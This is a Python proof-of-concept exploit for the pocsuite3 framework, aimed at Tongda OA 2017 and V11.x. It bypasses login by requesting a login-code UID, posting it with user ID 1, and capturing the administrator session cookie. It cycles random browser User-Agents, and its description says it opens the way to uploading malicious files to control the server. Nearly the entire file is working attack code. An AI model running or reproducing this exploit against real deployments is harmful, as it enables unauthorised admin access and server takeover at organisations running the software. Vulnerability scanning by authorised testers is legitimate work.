#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2021/6/26 22:08
# @Author  : ox400
# @Email   : ox01024@163.com
# @File    : any_user_login.py
# 该poc核心代码来自https://github.com/NS-Sp4ce/TongDaOA-Fake-User
# 感谢 @NS-Sp4ce

import json
from random \
    import choice
from pocsuite3.api \
    import Output, POCBase, register_poc, requests


class DemoPOC(POCBase):
    vulID = '0003'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  # 默认为1
    author = '0x400'  # PoC作者的大名
    vulDate = 'null'  # 漏洞公开的时间,不知道就写今天
    createDate = '2021-06-26'  # 编写 PoC 的日期
    updateDate = '2021-06-30'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'null']  # 漏洞地址来源,0day不用写
    name = '通达OA 任意用户登录'  # PoC 名称
    appPowerLink = 'https://www.tongda2000.com/'  # 漏洞厂商主页地址
    appName = 'tongdaOA'  # 漏洞应用名称
    appVersion = '通达OA 2017、V11.X--V11.5'  # 漏洞影响版本
    vulType = 'Login Bypass'  # 漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
            未经授权的攻击者可以通过构造进行任意用户登录（包括admin），登录之后可进一步上传恶意文件控制网站服务器。
        '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' poc的用法描述 '''
    USER_AGENTS = [
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
        "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
        "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
        "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
        "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"]
    headers = {}

    def get_V11Cookie(self, url):
        checkUrl = url + '/general/login_code.php'
        try:
            self.headers["User-Agent"] = choice(self.USER_AGENTS)
            res = requests.get(checkUrl, headers=self.headers)
            resText = str(res.text).split('{')
            codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
            getSessUrl = url + '/logincheck_code.php'
            res = requests.post(
                getSessUrl,
                data={
                    'CODEUID': '{' + codeUid + '}',
                    'UID': int(1)},
                headers=self.headers)
            Cookie = res.headers['Set-Cookie']
            return url, 'V11', Cookie
        except BaseException:
            return False

    def get_V2017Cookie(self, url):
        checkUrl = url + '/ispirit/login_code.php'
        try:
            self.headers["User-Agent"] = choice(self.USER_AGENTS)
            res = requests.get(checkUrl, headers=self.headers)
            resText = json.loads(res.text)
            codeUid = resText['codeuid']
            codeScanUrl = url + '/general/login_code_scan.php'
            res = requests.post(
                codeScanUrl,
                data={
                    'codeuid': codeUid,
                    'uid': int(1),
                    'source': 'pc',
                    'type': 'confirm',
                    'username': 'admin'},
                headers=self.headers)
            resText = json.loads(res.text)
            status = resText['status']
            if status == str(1):
                getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
                res = requests.get(getCodeUidUrl)
                Cookie = res.headers['Set-Cookie']
                return url, 'V2017', Cookie
            else:
                return False
        except BaseException:
            return False

    def _check(self, url):
        v11crack = self.get_V11Cookie(url)
        v2017crack = self.get_V2017Cookie(url)
        if v11crack:
            return v11crack
        if v2017crack:
            return v2017crack
        return False

    def _verify(self):
        result = {}
        p = self._check(self.url)
        if p:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = p[0]
            result['VerifyInfo']['Version'] = p[1]
            result['VerifyInfo']['Cookie'] = p[2]
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            # weak
            output.success(result)
        else:
            # not weak
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
